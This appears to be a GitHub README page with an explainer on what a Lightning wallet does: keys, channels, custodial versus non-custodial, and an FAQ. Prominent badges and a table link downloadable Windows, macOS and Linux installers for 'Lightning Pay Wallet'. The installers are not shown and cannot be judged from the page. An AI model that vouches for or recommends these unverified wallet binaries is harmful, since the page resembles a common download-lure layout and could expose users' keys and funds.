<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What a Lightning wallet is, in plain terms
A wallet that holds keys, opens channels, and speaks the Lightning protocol for you.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

A Lightning wallet is software that holds your keys, keeps a channel open, and turns "pay this invoice"
into the sequence of signed messages the network needs. It is the user-facing half of everything
described in [what the Lightning Network is](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-the-lightning-network.md).

## Three jobs

**Keys.** The wallet generates and stores the private keys that control your bitcoin. In a
non-custodial wallet those keys never leave your device.

**Channels.** The wallet opens, maintains and closes the channels that hold your Lightning balance. In
a desktop wallet like this one, that happens without you managing peers or liquidity by hand.

**Protocol.** Invoices, route finding, fee selection and failure handling are all the wallet's work.
You see an amount and a confirm button.

## Custodial and non-custodial, in one line

A custodial Lightning wallet holds the keys for you, so a login restores access and a company failure
loses it. A non-custodial wallet holds the keys on your device, so a phrase restores access and nobody
can freeze it. This site is about the second kind.

## What a wallet is not

It is not an exchange: it cannot sell bitcoin for currency. It is not a node operator's tool: you do
not choose peers or earn routing fees. And it is not a bank: there is no account, no statement and no
support line that can move your money.

## What you have to do

Keep the recovery phrase. Keep the channel backup if the wallet produces one. Keep the wallet online
when you expect to be paid. Everything else is the software's job, and the limits of that are covered
in [what you actually hold in a Lightning wallet](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-you-hold-in-a-lightning-wallet.md).

## Questions people ask

### Do I need to run a node?

No. A wallet is a node from your side of the screen; you never see the peer list.

### Can a Lightning wallet hold on-chain bitcoin too?

Yes, and most do. The two balances sit side by side and travel on different rails.

### What happens if I close the app?

Nothing is lost, but you cannot receive while it is closed, and a payment in flight may fail.

## Related guides

- [What the Lightning Network is and how a payment moves](https://github.com/bitcoin-lightning-wallet/lightning-wallet-basics/blob/HEAD/what-is-the-lightning-network.md)

